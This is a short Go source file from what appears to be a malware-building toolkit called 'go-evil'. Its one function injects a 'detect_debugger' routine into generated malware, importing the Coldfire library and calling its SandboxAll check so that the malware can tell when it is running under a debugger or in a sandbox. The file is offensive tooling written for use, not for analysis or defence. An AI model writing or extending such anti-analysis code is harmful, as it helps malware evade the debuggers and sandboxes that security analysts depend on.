package debugger

import "github.com/TeamPhoneix/go-evil/utility/structure"

// Adds the responsible code used for detecting if the malware is launched
// under a debugger
func identify(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func detect_debugger() bool {", "return coldfire.SandboxAll()", "}"}

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_function(body)

	return structure.Send(data_object)
}
